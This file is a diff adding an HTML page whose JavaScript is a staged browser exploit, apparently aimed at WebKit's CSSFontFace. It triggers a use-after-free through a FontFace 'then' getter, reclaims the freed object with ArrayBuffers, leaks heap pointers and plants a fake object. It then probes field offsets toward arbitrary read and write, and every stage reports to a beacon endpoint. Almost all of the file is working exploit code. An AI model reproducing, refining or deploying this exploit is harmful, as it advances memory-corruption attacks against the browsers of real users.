@@ -1,0 +1,468 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1217 fake CSSFontFace controlled read/write</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1217 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1217: Fake CSSFontFace — controlled pointer redirect + read
+
+   P1216 confirmed:
+   - Stage 1 leak: 0x10008b8e20 / 0x10007ea610 (attempt 2!)
+   - Stage 2: template ACCEPTED (engine trusts our fake CSSFontFace)
+   - Stage 3: check("1em f1")=true while f1infonts=false
+     → engine's CSS resolver still references our controlled buffer
+   - S3-NOWRITES: engine didn't add new data after template set
+
+   PLAN: After template acceptance, MODIFY pointer fields in our buffer
+   and trigger engine operations that dereference them. If the engine
+   reads through our controlled pointer, we get arbitrary read.
+
+   CSSFontFace layout (192 bytes):
+   +0x00: refcount (must stay >= 1)
+   +0x08..+0x50: various fields (ranges, properties, source list)
+   +0x58: m_clients (WeakHashSet<CSSFontFaceClient>)
+   +0x68: m_wrapper (WeakPtr<FontFace>)
+   +0x70..+0xBF: more fields
+
+   Operations that walk the object:
+   - document.fonts.check() → status() → reads m_status field
+   - setStatus() → walks m_clients to notify
+   - FontFace descriptor setters → trigger font invalidation
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1217-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+var K=8, SIZE=192;
+var styleEl=null, firedHere=false;
+var leaked={p58:null,p68:null};
+var templateBuf=null; /* THE buffer the engine trusts */
+
+function hex(v){return ('0'+v.toString(16)).slice(-2);}
+function hexq(arr){
+  if(!arr)return 'null';
+  var s='0x';for(var i=7;i>=0;i--)s+=hex(arr[i]);return s;
+}
+function grab(view,off){var a=[];for(var i=0;i<8;i++)a.push(view[off+i]);return a;}
+function setq(view,off,arr){for(var i=0;i<8;i++)view[off+i]=arr[i];}
+
+/* Convert a uint64 (as [lo...hi] byte array) to BigInt */
+function bytesToBigInt(arr){
+  var s='0x';for(var i=7;i>=0;i--)s+=hex(arr[i]);return BigInt(s);
+}
+/* Convert BigInt to byte array */
+function bigIntToBytes(bi){
+  var a=[];for(var i=0;i<8;i++){a.push(Number(bi&0xFFn));bi>>=8n;}return a;
+}
+
+function setupFace(name,cssName,range){
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: "+cssName+"; src: local(Arial); unicode-range: "+range+"; }";
+  document.head.appendChild(styleEl);
+  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  if(!window.__alive)window.__alive=[];
+  window.__alive.push(A);
+}
+
+function installGetter(fillTemplate){
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      window.__map=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZE);
+        var v=new Uint8Array(ab);
+        if(fillTemplate&&leaked.p58){
+          setq(v,0x00,[0x01,0,0,0,0,0,0,0]);
+          setq(v,0x58,leaked.p58);
+          setq(v,0x68,leaked.p68);
+        }
+        window.__map.push({size:SIZE,view:v,ab:ab});
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+}
+
+S.textContent='P1217 STAGE 1: RECLAIM...';
+msg('starting stage 1 (p563 leak)...');
+B('START','stage1');
+
+/* ═══════ STAGE 1: Leak heap pointers ═══════ */
+window.__alive=[];
+setupFace('f0','s0','U+0042');
+installGetter(false);
+B('S1-SETUP','ok');
+
+document.fonts.load('1em f0, s0','AB').then(
+  function(){B('S1-RESOLVED','ok');},
+  function(){B('S1-REJECTED','err');}
+);
+
+setTimeout(function(){
+  var m=window.__map;
+  if(!m||!m.length){B('S1-NOMAP','empty');return;}
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+  if(best<0){
+    B('S1-CLEAN','bufs='+m.length);
+    setTimeout(function(){location.reload();},500);
+    return;
+  }
+  var v=m[best].view;
+  leaked.p58=grab(v,0x58);
+  leaked.p68=grab(v,0x68);
+  B('S1-HIT','b'+best+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+  msg('S1 HIT: +0x58='+hexq(leaked.p58)+' +0x68='+hexq(leaked.p68));
+  S.textContent='STAGE 1 HIT! Stage 2...';
+  setTimeout(runStage2,200);
+},60);
+
+setTimeout(function(){
+  if(leaked.p58)return;
+  var m=window.__map;
+  if(!m||!m.length)return;
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+  if(best<0)return;
+  var v=m[best].view;
+  leaked.p58=grab(v,0x58);
+  leaked.p68=grab(v,0x68);
+  B('S1-HIT2','b'+best+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+  msg('S1 HIT (400ms): +0x58='+hexq(leaked.p58)+' +0x68='+hexq(leaked.p68));
+  setTimeout(runStage2,200);
+},400);
+
+setTimeout(function(){
+  if(leaked.p58)return;
+  B('S1-TIMEOUT','nohit');
+  setTimeout(function(){location.reload();},500);
+},2000);
+
+
+/* ═══════ STAGE 2: Template acceptance ═══════ */
+function runStage2(){
+  msg('=== STAGE 2: Template ===');
+  B('S2-START','p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+  S.textContent='STAGE 2: TEMPLATE...';
+
+  setupFace('f1','s1','U+0043');
+  installGetter(true);
+  B('S2-SETUP','ok');
+
+  document.fonts.load('1em f1, s1','AB').then(
+    function(){
+      B('S2-RESOLVED','accepted');
+      msg('S2 RESOLVED — template accepted!');
+
+      /* find which buffer the engine is using (it should have our template) */
+      var m2=window.__map;
+      for(var i=0;i<m2.length;i++){
+        var v=m2[i].view;
+        /* check if our refcount=1 is still there */
+        if(v[0]===1&&v[1]===0&&v[2]===0&&v[3]===0){
+          /* verify +0x58 matches */
+          var match=true;
+          for(var b=0;b<8;b++){
+            if(v[0x58+b]!==leaked.p58[b]){match=false;break;}
+          }
+          if(match){
+            templateBuf=m2[i];
+            B('S2-FOUND','buf'+i);
+            msg('template buffer: index '+i);
+            break;
+          }
+        }
+      }
+
+      S.textContent='TEMPLATE ACCEPTED! Stage 3...';
+      setTimeout(runStage3,300);
+    },
+    function(){B('S2-REJECTED','rejected');}
+  );
+}
+
+
+/* ═══════ STAGE 3: Exploit the fake CSSFontFace ═══════ */
+function runStage3(){
+  msg('');
+  msg('=== STAGE 3: Controlled pointer experiments ===');
+  S.textContent='STAGE 3: EXPLOITING...';
+  B('S3-START','exploiting');
+
+  if(!templateBuf){
+    B('S3-NOBUF','no-template');
+    msg('ERROR: no template buffer found');
+    return;
+  }
+
+  var tv=templateBuf.view;
+  var bv=new BigUint64Array(templateBuf.ab);
+
+  /* 3A: Read ALL fields of our controlled buffer via BigUint64Array
+     This gives us 64-bit precision reads */
+  var fieldDump=[];
+  for(var i=0;i<SIZE/8;i++){
+    var val=bv[i];
+    if(val!==0n){
+      fieldDump.push('+0x'+(i*8).toString(16)+'=0x'+val.toString(16));
+    }
+  }
+  B('S3-FIELDS',fieldDump.join('|'));
+  msg('non-zero fields: '+fieldDump.join(', '));
+
+  /* 3B: Experiment — modify m_status field and see if check() changes
+     CSSFontFace::status() reads m_status which is a small enum.
+     In WebKit source: m_status is at different offsets depending on version.
+     Let's probe systematically: write known values at various offsets
+     and check if document.fonts.check() behavior changes. */
+
+  var checkBefore='unknown';
+  try{checkBefore=document.fonts.check('1em f1')?'T':'F';}catch(e){checkBefore='E';}
+  B('S3-CHECK0','before='+checkBefore);
+  msg('check before mutations: '+checkBefore);
+
+  /* Try modifying bytes at offsets 0x08 through 0x50 (skip refcount and pointers)
+     to find m_status. Status enum: 0=Pending, 1=Loading, 2=TimedOut, 3=Success, 4=Failure
+     If check() returns different results for different status values, we found it. */
+
+  var statusFindings=[];
+  var testOffsets=[0x08,0x0C,0x10,0x14,0x18,0x1C,0x20,0x24,0x28,0x2C,
+                   0x30,0x34,0x38,0x3C,0x40,0x44,0x48,0x4C,0x50,0x54,
+                   0x70,0x74,0x78,0x7C,0x80,0x84,0x88,0x8C,0x90,0x94,
+                   0x98,0x9C,0xA0,0xA4,0xA8,0xAC,0xB0,0xB4,0xB8,0xBC];
+
+  for(var ti=0;ti<testOffsets.length;ti++){
+    var off=testOffsets[ti];
+    var orig=tv[off];
+
+    /* Write status=4 (Failure) at this offset */
+    tv[off]=4;
+    var c4='?';
+    try{c4=document.fonts.check('1em f1')?'T':'F';}catch(e){c4='E:'+e.message.slice(0,30);}
+
+    /* Write status=0 (Pending) */
+    tv[off]=0;
+    var c0='?';
+    try{c0=document.fonts.check('1em f1')?'T':'F';}catch(e){c0='E:'+e.message.slice(0,30);}
+
+    /* Write status=3 (Success) */
+    tv[off]=3;
+    var c3='?';
+    try{c3=document.fonts.check('1em f1')?'T':'F';}catch(e){c3='E:'+e.message.slice(0,30);}
+
+    tv[off]=orig; /* restore */
+
+    if(c4!==c0||c4!==c3||c0!==c3){
+      statusFindings.push('+0x'+off.toString(16)+':4='+c4+'/0='+c0+'/3='+c3);
+      msg('STATUS DISCRIMINATOR at +0x'+off.toString(16)+': F(4)='+c4+' P(0)='+c0+' S(3)='+c3);
+    }
+  }
+
+  B('S3-STATUS',statusFindings.length>0?statusFindings.join('|'):'none');
+
+  /* 3C: Try reading through our controlled +0x58 pointer.
+     The WeakHashSet at +0x58 is m_clients. If we create a SECOND FontFace
+     that uses our fake CSSFontFace's family, setStatus might walk m_clients.
+
+     More promising: try to trigger a notifyClients() call by changing status.
+     If the engine dereferences +0x58 as a WeakHashSet*, we crash predictably.
+     By pointing +0x58 at a known buffer, we control what the engine reads. */
+
+  /* First: create a bunch of BigUint64Array(24) buffers as potential read targets.
+     Each 192-byte buffer = 24 qwords. Fill with unique markers. */
+  var readTargets=[];
+  for(var i=0;i<128;i++){
+    var ab=new ArrayBuffer(192);
+    var bv2=new BigUint64Array(ab);
+    /* Fill with recognizable pattern: 0xAAAA_<index>_BBBB_<offset> */
+    for(var j=0;j<24;j++){
+      bv2[j]=BigInt('0xAAAA'+(i).toString(16).padStart(4,'0')+'BBBB'+(j).toString(16).padStart(4,'0'));
+    }
+    readTargets.push({ab:ab,bv:bv2,u8:new Uint8Array(ab)});
+  }
+  window.__readTargets=readTargets;
+  B('S3-TARGETS','count=128');
+  msg('sprayed 128 x 192B read targets with markers');
+
+  /* 3D: Attempt to find self-address via heap distance estimation.
+     Our leaked p58 = 0x10008b8e20 and p68 = 0x10007ea610.
+     The distance between them: p58 - p68 ≈ 0xCE810 (~845 KB apart).
+     Our ArrayBuffer backings are allocated from the same heap.
+     Typical bmalloc page size = 16KB. */
+
+  var p58bi=bytesToBigInt(leaked.p58);
+  var p68bi=bytesToBigInt(leaked.p68);
+  var dist=p58bi>p68bi?p58bi-p68bi:p68bi-p58bi;
+  B('S3-DIST','p58=0x'+p58bi.toString(16)+'|p68=0x'+p68bi.toString(16)+'|dist=0x'+dist.toString(16));
+  msg('heap distance: 0x'+dist.toString(16)+' ('+Number(dist)+' bytes)');
+
+  /* 3E: The REAL experiment — try using the fake CSSFontFace to discover
+     our own buffer address. We know the WeakHashSet impl structure:
+
+     WeakHashSetImpl has:
+     - m_table (pointer to hash table)
+     - m_tableSize
+     - m_keyCount
+
+     If we set +0x58 to point INSIDE one of our read target buffers,
+     and the engine tries to iterate m_clients, it will read our marker values
+     as the hash table pointer/size/count.
+
+     But we don't know where our buffers are... UNLESS we can make the engine
+     WRITE something that reveals the address.
+
+     Alternative approach: use BigUint64Array on the TEMPLATE buffer to read
+     what the engine writes there next. If any operation writes an address
+     back into our buffer, we capture it. */
+
+  /* 3F: Monitor the template buffer for any new writes.
+     Take a snapshot, trigger various operations, then compare. */
+  var snapshot=new BigUint64Array(24);
+  for(var i=0;i<24;i++)snapshot[i]=bv[i];
+
+  /* Trigger operations that might write to the fake CSSFontFace */
+  try{
+    /* Create a new style that references font f1 */
+    var testEl=document.createElement('div');
+    testEl.style.cssText='font-family:f1,serif;font-size:48px;position:absolute;left:-9999px';
+    testEl.textContent='PROBE';
+    document.body.appendChild(testEl);
+    void testEl.offsetWidth; /* force layout */
+    B('S3-LAYOUT','forced');
+    msg('forced layout with fake font');
+  }catch(e){
+    B('S3-LAYOUT-ERR',e.message);
+  }
+
+  /* Check for any mutations */
+  setTimeout(function(){
+    var mutations=[];
+    for(var i=0;i<24;i++){
+      if(bv[i]!==snapshot[i]){
+        mutations.push('+0x'+(i*8).toString(16)+': 0x'+snapshot[i].toString(16)+' -> 0x'+bv[i].toString(16));
+      }
+    }
+    if(mutations.length>0){
+      B('S3-MUTATED',mutations.join('|'));
+      msg('BUFFER MUTATED BY ENGINE:');
+      for(var m=0;m<mutations.length;m++)msg('  '+mutations[m]);
+    }else{
+      B('S3-NOMUT','stable');
+      msg('buffer stable after layout');
+    }
+
+    /* 3G: Final full dump of template buffer */
+    var finalDump=[];
+    for(var i=0;i<24;i++){
+      if(bv[i]!==0n)finalDump.push('+0x'+(i*8).toString(16)+'=0x'+bv[i].toString(16));
+    }
+    B('S3-FINAL',finalDump.join('|'));
+
+    /* 3H: Try additional operations */
+    tryAdditional();
+  },200);
+}
+
+function tryAdditional(){
+  if(!templateBuf)return;
+  var tv=templateBuf.view;
+  var bv=new BigUint64Array(templateBuf.ab);
+
+  msg('');
+  msg('=== STAGE 3H: Additional experiments ===');
+
+  /* Try: create FontFace FROM our template's font-family name and load it
+     This might trigger CSSFontFace::fontLoaded() which accesses more fields */
+  try{
+    var f2=new FontFace('f1','local(Helvetica)');
+    document.fonts.add(f2);
+    f2.load().then(function(){
+      B('S3-F2LOAD','resolved');
+      msg('f2(f1, Helvetica) load resolved');
+    }).catch(function(e){
+      B('S3-F2LOAD-ERR',e.message);
+    });
+  }catch(e){
+    B('S3-F2-ERR',e.message);
+  }
+
+  /* Try: iterate document.fonts and read status */
+  try{
+    var fontStatus=[];
+    document.fonts.forEach(function(f){
+      fontStatus.push(f.family+':'+f.status);
+    });
+    B('S3-FONTSTATUS',fontStatus.join(','));
+    msg('font statuses: '+fontStatus.join(', '));
+  }catch(e){
+    B('S3-FONTSTATUS-ERR',e.message);
+  }
+
+  /* Try: call document.fonts.load() again — might trigger setStatus on our face */
+  try{
+    document.fonts.load('1em f1','X').then(function(){
+      B('S3-RELOAD','resolved');
+
+      /* Check buffer again after load */
+      var post=[];
+      for(var i=0;i<24;i++){
+        if(bv[i]!==0n)post.push('+0x'+(i*8).toString(16)+'=0x'+bv[i].toString(16));
+      }
+      B('S3-POSTLOAD',post.join('|'));
+      msg('buffer after re-load: '+post.join(', '));
+    }).catch(function(e){
+      B('S3-RELOAD-ERR',e.message);
+    });
+  }catch(e){}
+
+  /* Final summary */
+  setTimeout(function(){
+    msg('');
+    msg('=== P1217 COMPLETE ===');
+    S.textContent='P1217 COMPLETE';
+    B('DONE','all-stages');
+  },1500);
+}
+
+</script>
+</body></html>
